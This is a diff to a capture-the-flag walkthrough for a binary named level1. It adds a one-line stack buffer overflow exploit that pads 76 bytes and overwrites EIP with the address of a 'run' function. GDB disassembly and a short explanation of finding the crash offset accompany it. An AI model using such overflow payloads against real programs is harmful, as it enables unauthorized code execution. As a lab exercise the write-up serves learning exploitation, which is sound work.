@@ -1,3 +1,12 @@
+# Walkthrough
+
+## Solution
+```
+$ (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1 
+```
+
+## Explanation
+
 GDB:
 info functions -> list all functions available
 
@@ -5,7 +14,7 @@ EIP: Instruction pointer, points to the next function to be executed
 
 https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 
-
+```
 (gdb) disas main
 Dump of assembler code for function main:
    0x08048480 <+0>:	push   %ebp
@@ -18,7 +27,6 @@ Dump of assembler code for function main:
    0x08048495 <+21>:	leave  
    0x08048496 <+22>:	ret    
 End of assembler dump.
-
 
 (gdb) info functions
 All defined functions:
@@ -64,7 +72,7 @@ Dump of assembler code for function run:
    0x0804847e <+58>:	leave  
    0x0804847f <+59>:	ret    
 End of assembler dump.
-
+```
 
 We need to overflow the buffer, to overwrite EIP with the run function address.
 With wiremask, we know that we segfault at character 76.
